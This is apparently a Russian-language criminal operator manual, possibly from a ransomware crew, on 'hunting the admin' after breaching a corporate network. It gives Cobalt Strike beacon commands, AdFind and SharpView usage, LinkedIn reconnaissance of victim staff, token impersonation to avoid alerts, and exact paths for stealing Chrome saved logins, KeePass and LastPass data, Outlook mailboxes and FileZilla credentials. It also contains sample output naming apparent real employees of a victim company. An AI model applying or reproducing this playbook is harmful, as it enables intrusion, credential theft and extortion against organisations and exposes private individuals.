@@ -1,0 +1,431 @@
+```Хантим админа.
+
+И так, если у нас есть сервера\НАСы\тейпы или облачные хранилища куда складываются бекапы,а доступа нет то нам нужны креды которые есть только у админа.
+Соответсвенно его нам надо схантить. Обычно в тех сетях которых мы работаем админов 1-2-3, не более.
+Люди делятся должностями на 3 типа:
+
+Senior(Старший)
+Medium(Средний)
+Junior(Младший)
+
+Конечно, нам интересны сеньоры так как у них привилегий\доступов(читай паролей) больше.
+
+
+Для начала напишу несколько вариантов как определить учетные записи тех самых администраторов, которые имеют на борту пароли.
+
+Часть1::
+      Вариант №1:
+         Опрашиваем ДА
+
+```
+
+beacon> shell net group "domain admins" /domain
+
+    Tasked beacon to run: net group "domain admins" /domain
+    host called home, sent: 64 bytes
+    received output:
+
+
+La demande sera traitée sur contrôleur de domaine du domaine DOMAIN.com.
+
+Nom de groupe     Domain Admins
+Commentaire       Designated administrators of the domain
+
+Membres
+
+-------------------------------------------------------------------------------
+Administrator            ClusterSvc               createch                 
+Createch2                d01adm                   da9adm                   
+p01adm                   PMPUser                  q01adm                   
+repl                     s01adm                   Sapserviced01           
+SAPServiceDA9            sapservicep01            SAPServiceQ01           
+sapservices01            SAPServiceSND            SAPServiceSOL           
+services                 services2                sndadm                   
+soladm                   somadm                   staseb                   
+telnet                   Johnadm               
+La commande s'est terminée correctement.
+
+```
+
+Смотрим и глазами фильтруем сервисные учетки и не сервисные.
+Сервисные из списка выше это например
+```
+SAPServiceDA9
+services
+telnet
+servies2
+Sapservice01
+...
+
+```
+
+Какие учетки нам СКОРЕЕ ВСЕГО подойдут:
+```staseb
+Johnadm
+```
+
+Их записали.
+
+Можем посмотреть кем они являются в adfind_persons.txt
+
+или через команду
+```shell net user staseb /domain
+```
+
+См пример:
+```
+
+beacon> shell net user ebernardo /domain
+
+    Tasked beacon to run: net user ebernardo /domain
+    host called home, sent: 57 bytes
+    received output:
+
+
+User name                    ebernardo
+Full Name                    Eric Bernardo
+Comment                     
+User's comment               
+Country/region code          (null)
+Account active               Yes
+Account expires              Never
+
+Password last set            2020-12-08 12:05:15 PM
+Password expires             2021-06-06 12:05:15 PM
+Password changeable          2020-12-08 12:05:15 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   2021-01-29 2:25:24 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Desktop Users
+                             *Server Operators     
+Global Group memberships     *US Users             *Great Plains Users   
+                             *Citrix Group         *VPN Users Saskatoon 
+                             *Admins - AD Basic    *VPNUsersHeadOffice   
+                             *Executives           *All Winnipeg Staff   
+                             *Scribe Console Users *Domain Admins       
+                             *VPN Users USA        *Workstation.admins   
+                             *Domain Users         
+The command completed successfully.
+
+```
+
+Смотрим кто такой - входит в десяток групп, ИНОГДА в колонке Comment пишут кем является - инженер\сис админ\саппорт\бизнес консультант.
+в Last Logon учетка должна быть АКТИВНАЯ - то есть ласт логон сегодня\вчера\на этой неделе, но никак не год назад или Never.
+Если не стало понятно кто это такой после опроса смотри adfind + проверяй linkedin(рздел ниже).
+
+Так 2-3-5 учеток в итоге выцепляешь из домен админов и опрашиваешь каждого и должен иметь представление кто это такой. По итогу 1-2-3 учетки получается найти кто может быть админом.
+
+
+   Вариант №2:
+      Превращаемся в домашних аналитиков - смотрим Adfind.
+      Нам интересен файл adfind_groups
+      Заходим, видим кучу текста
+      Жмём Ctrl + F(Notepad2 / Geany)
+      Вводим
+      ```dn:CN=
+      ```
+      И кнопочку Find All in current document.
+      
+      на выходе получаем ПРИМЕРНО следующее(я вырезал кусок и оставил 10-20 строк, обычно тут от 100 до 10000 строк)
+      ```
+      
+adfind_groups:3752: dn:CN=SQLServer2005SQLBrowserUser$TRUCAMTLDC,CN=Users,DC=domain,DC=com
+adfind_groups:3775: dn:CN=clubsocial,CN=Users,DC=domain,DC=com
+adfind_groups:3800: dn:CN=Signature Intl-Special,OU=Groupes,OU=Infra,DC=domain,DC=com
+adfind_groups:3829: dn:CN=FIMSyncAdmins,CN=Users,DC=domain,DC=com
+adfind_groups:3852: dn:CN=GRP-GRAPHISTE,OU=FG-GRP,DC=domain,DC=com
+adfind_groups:3877: dn:CN=IT,CN=Users,DC=domain,DC=com
+adfind_groups:3902: dn:CN=MSOL_AD_Sync_RichCoexistence,CN=Users,DC=domain,DC=com
+adfind_groups:3925: dn:CN=WinRMRemoteWMIUsers__,CN=Users,DC=domain,DC=com
+adfind_groups:3946: dn:CN=EDI,CN=Users,DC=domain,DC=com
+adfind_groups:3967: dn:CN=Signature Canada,OU=Groupes,OU=Infra,DC=domain,DC=com
+adfind_groups:4037: dn:CN=Signature USA,OU=Groupes,OU=Infra,DC=domain,DC=com
+
+      ```
+      
+      И так, мы извлекли группы active directory.
+      Что нам здесь интересно и для чего мы это сделали - в active directroy всё структурируется и в USA EU сетях всё делает максиимально понятно прозрачно с комментариями, пометками, прописями итд
+      Нам интересная группа которая занимается IT, администрированием, инженерией ЛВС.
+      То что после поиска нам выдало - выносим в новый блокнот и делаем поиск по следующи ключ словам:
+      ```
+      IT
+      Admin
+      engineer
+      -----
+      ```
+      
+      В примере выше мы находим следующую строку
+      ```
+      adfind_groups:3877: dn:CN=IT,CN=Users,DC=domain,DC=com
+      ```
+      
+      Переходим по строке 3877 в adfind_Groups.txt и видим следующее:
+      ```
+      
+dn:CN=IT,CN=Users,DC=domain,DC=com
+>objectClass: top
+>objectClass: group
+>cn: IT
+>description: Informatique
+>member: CN=MS Surface,OU=IT,DC=domain,DC=com
+>member: CN=Gyslain Petit,OU=IT,DC=domain,DC=com
+>member: CN=ftp,CN=Users,DC=domain,DC=com
+>member: CN=St-Amand\, Sebastien\, CDT,OU=IT,DC=domain,DC=com
+```
+
+Пользователи ftp и MS Surface пропускаем, а вот Gyslain Petit и St Amand Sebastien берем в оборот.
+Далее открываем ad_users.txt
+Вводим Gyslain Petit
+Находим пользователя со следующей информацией:
+```
+
+dn:CN=Gyslain Petit,OU=IT,DC=trudeaucorp,DC=com
+>objectClass: top
+>objectClass: person
+>objectClass: organizationalPerson
+>objectClass: user
+>cn: Gyslain Petit
+>sn: Petit
+>title: Directeur, technologie de l'information
+>physicalDeliveryOfficeName: 217
+>givenName: Gyslain
+>distinguishedName: CN=Gyslain Petit,OU=IT,DC=trudeaucorp,DC=com
+>instanceType: 4
+>whenCreated: 20020323153742.0Z
+>whenChanged: 20201212071143.0Z
+>displayName: Gyslain Petit
+>uSNCreated: 29943
+>memberOf: CN=GRP_Public_USA_P,OU=Securite-GRP,DC=trudeaucorp,DC=com
+>memberOf: CN=GRP-LDAP-VPN,OU=FG-GRP,DC=trudeaucorp,DC=com
+>memberOf: CN=IT Support,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=Directeurs,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=GRP-IT,OU=FG-GRP,DC=trudeaucorp,DC=com
+>memberOf: CN=Signature Canada,OU=Groupes,OU=Infra,DC=trudeaucorp,DC=com
+>memberOf: CN=EDI,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=IT,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=TRUDEAU-MONTREAL,CN=Users,DC=trudeaucorp,DC=com
+>memberOf: CN=everyone,CN=Users,DC=trudeaucorp,DC=com
+>uSNChanged: 6908986
+>department: IT Manager
+```
+Смотрим title и кто это у нас тут? Директор информационных технологий. В яблочко, казалось бы, но директор не всегда имеет у себя пароли, а вот System Administrator какой нибудь - вполне.
+Поэтому по второму пользователю и более проводим аналогичные манипуляции. У себя(=в конфе) делаем заметки кто есть кто и записываем логины из адфайнда(sAMAccountname) примерно так:
+```>sAMAccountName: gpetit
+```
+
+```
+gpetit - Директор айти
+staseb - такой то такой
+```
+
+
+Вторая часть варианта №2(Упрощенная):
+Смотрим изначально в adfind_users.txt
+Делаем поиск по
+```title:
+description
+departament
+```
+Если повезет, то там будет прям написаны должности. В моем тестовом кейсе это выглядит вот так:
+
+```
+adfind_persons:280: >title: Responsable, logistique direct import
+adfind_persons:1836: >title: Chef des services techniques
+adfind_persons:1955: >title: Chef comptable
+adfind_persons:4544: >title: Directeur, technologie de l'information
+adfind_persons:6064: >title: Présidente
+adfind_persons:6191: >title: Chargée de projets, mise en marché
+adfind_persons:6285: >title: Directrice marketing
+adfind_persons:6848: >title: Coordonnatrice à la logistique
+adfind_persons:6948: >title: Responsable de l'expedition
+```
+
+Соответсвенно глазами пробегаем и учетки найдены.
+
+
+И так, это easy методы. Рассмотрим альтернативные поиски учеток админа.
+Я знаю пока только 1 метод из простых - linkedin
+Вбиваем в гугл запрос
+```
+НАШАЖЕРТВА.КОМ linkedin
+```
+вместо домен - вставить домен конторы.
+
+Переходим в Members
+Делаем поиск там по
+```
+System
+Admin
+Engineer
+Network
+It
+```
+Если у кого то выпало имя + фамилия, то вбиваем его в адфайнд и учетка найдены.
+Если знаете о методах эффективнее - пожалуйста, напишите @rozetka
+
+И так, часть №1 закончена.
+
+Приступаем к ханту админа и осмотру
+
+Часть №2:
+Хантим админа стандартно через SharpView
+SharpView.exe можете взять в конференции у своих тимлидов либо с конфы софта
+Команда для ханта такая:
+On Linux
+```
+execute-assembly /home/user/soft/scripts/SharpView.exe Find-DomainUserLocation -UserIdentity gpetit
+```
+On Windows >
+```
+execute-assembly C:\Users\Андрей\Soft\Hacking\SharpView.exe Find-DomainUserLocation -UserIdentity gpetit
+```
+
+где gpetit - учетная запись того кого ищем. то, что записано в adfinusers в sAMAccountname - вставляем именно сюда.
+
+На выходе получаем примерно следующий лог:
+
+```
+
+UserDomain      : domain
+UserName        : gpetit
+ComputerName    : DC01.domain.LOCAL
+IPAddress       : 172.16.1.3
+SessionFrom     : 192.168.100.55
+SessionFromName :
+LocalAdmin      :
+
+UserDomain      : domain
+UserName        : gpetit
+ComputerName    : SQL01.domain.LOCAL
+IPAddress       : 172.16.1.30
+SessionFrom     :  192.168.100.55
+SessionFromName :
+LocalAdmin      :
+
+UserDomain      : domain
+UserName        : gpetit
+ComputerName    : lptp-gpetit.domain.LOCAL
+IPAddress       : 172.16.1.40
+SessionFrom     : 192.168.100.55
+SessionFromName :
+LocalAdmin      :
+
+```
+
+
+И так, лог будет примерного такого формата, как нам с этим быть -
+Во первых, как работает софт - он опрашивает где в даннай  момент хоть как то авторизован пользователь. А пользователь у нас не простой - он администратор и в какой то момент он может быть авторизован на 20-30-50 серверах.
+Как нам фильтрануть и не увязнуть в этом?
+Во первых, убираем неинтересные нам ОС
+например первый в списке DC01 - явно ДоменКонтроллер01, можно его проверить по adfind_computers.txt либо portscan 172.16.1.13 и увидеть, что это СЕРВЕРНАЯ ОС. А нам нужна клиентская.
+Вторая - SQL01 - БДшная ОС. Нам не подходит.
+Смотрим третью - lptp-gpetit. Хм, нашего пользователя зовут gpetit, а lptp - означает laptop, то есть ноутбук. Возможно это как раз он.
+#Также бывает, что админ подключен ТОЛЬКО на серверные ОС, но в колонке SessionFrom - айпи из другого сабнета(например впн сабнет) где он тихо сидит но SharpView его не "взяло" - тоже можно взять в оборот.
+Далее - ВАЖНЫЙ ПУНКТ.
+Новички первым делом пытаются поднять там сессию и ОЧЕНЬ ЧАСТО ловят алерт. Алерт у админа = выпиливание из сети, потеря времени, нервов. Так делать НЕЛЬЗЯ!
+Что мы будем делать - опрашивать его через файловую систему.
+Делаем следующее
+```shell net view \\172.16.1.40 /ALL
+```
+
+На выходе видим его локальные дики
+```
+C$
+D$
+```
+Обуваем токен(Рекомендуется именно токен, ибо pth оставляет несколько иной Event ID на домен контроллере, а это может заметить админ и выпилить нас)
+
+Открываем File Manager в кобальте:
+```\\172.16.1.40\c$
+```
+
+либо используем shell через
+```
+shell dir \\172.16.1.40\c$```
+
+Смотрим что на диске C бегло
+Переходим в папку
+```\\172.16.1.40\c$\Users\gpetit
+```
+
+Обычно если это ДЕЙСТВИТЕЛЬНО воркстанция админа - у него много хлама аля Virtualbox / putty / winscp итд итп
+
+Как нам его "осмотреть", вот список интересных директорий:
+
+Рабочий стол
+```\\172.16.1.40\c$\Users\gpetit\Desktop
+```
+```
+\\172.16.1.40\c$\Users\gpetit\OneDrive
+\\172.16.1.40\c$\Users\gpetit\Downloads
+\\172.16.1.40\c$\Users\gpetit\Desktop
+\\172.16.1.40\c$\Users\gpetit\Documents
+
+```
+Здесь лежат папки с конфигурациями пользовательскими, ниже список того что можно будет извлечь:
+```\\172.16.1.40\c$\Users\gpetit\AppData\Local
+```
+
+```\\172.16.1.40\c$\Users\gpetit\AppData\Roaming
+```
+
+```
+\\172.16.1.40\c$\Users\gpetit\AppData\Local\Google\Chrome\User Data\Default
+```
+Здесь лежат History && Login Data от хрома.
+Хистори можно прямо скачать и осмотреть с помощью DBrowser for SQLite(nix win). Чем полезно -  посмотреть куда админ ходит, за кого голосует, можно сортануть хистори по заголовку и найти прям NAS / Tape / vSphere итд. ОЧЕНЬ полезная вещь.
+Login Data - лежат логины и пароли. Зашифрованные(!). Если весит 38-42kb то там ПУСТО. Если весит больше 40-45кб( от 100кб до 1-2мегабайт) - значит там ТОЧНО есть пароли. Если есть нужный URL с сохр паролем - обратись к своему тимлиду.
+Также бывает в хроме, что в Логин Дате нет паролей, но если внимательно рассмотреть папку профиля, то найдется папка extenstions а там lastpass. Такое тоже в практике может случатся - в таком случае заходить по RDP ночью и экспортировать пароли(либо кейлогер или др варианты)
+
+Аналогично можно посмотреть папку Firefox / Edge (пути дополню, гуглятся легко)
+
+также у сис админов ЧАСТО встречаться в AppData\Roaming && AppData\Local следующие папки:
+```Keepass
+LastPass
+```
+там их конфиги. Тащим их, выкладываем в конфу. если такое нашли - значит СКОРЕЕ ВСЕГО там масса именно ТЕХ САМЫХ нужных паролей.
+
+Также случается, что админ прямо на десктопе хранит аля
+```access.xlsx
+passwords.docx
+```
+Качаем, ломаем, смотрим.
+
+также есть папка outlook
+```\\172.16.1.40\c$\Users\gpetit\AppData\Local\Microsoft\Outlook
+```
+Здесь лежит файл аля
+```gpetit@domain.com - Exchange1.ost
+```
+В нём ПЕРЕПИСКА данного перца. Её можно скачать к себе , открыть free ost viewer и посмотреть почту вход\исход. РЕГУЛЯРНО бывает полезно разобраться в сложных ситуациях именно этим приёмом.
+Копируется просто - вырубаем outlook.exe, делаем копипаст .ost файла, потом пользователь сам себе откроет outlook.
+
+```
+\\172.16.1.40\c$\Users\gpetit\AppData\Local\Filezilla
+\\172.16.1.40\c$\Users\gpetit\AppData\Roaming\Filezilla
+```
+Здесь файлы sitemanager.xml могут быть с кредами от FTP SSH. Качаем, смотрим, кидаем в конфу.
+
+
+Также осматриваем \\172.16.1.40\C$\ProgramData
++Program files / x86
++ Локальные диски которые выпали в net view \\host /ALL
+D$ итд
+
+Также в ad_users.txt бывает homeDir - её тоже смотрим, изучаем.
+
+
+Вроде всё.
+
+Для чего мануал был написан - чтоб не пытались сломя голову идти поднимать сессию и ловить алерты от админа.
+Наша работа скорее заключается в том, чтобы разобраться что как устроено, а не настраивать брутфорс во всевозможные доступы.
+Всё уже хакнуто, надо просто посмотреть на всё !глазами админа!
+Главная задача при ханте админа - понять, где он хранит пароли и стащить БД\ексельку\файл\текствоик\документ
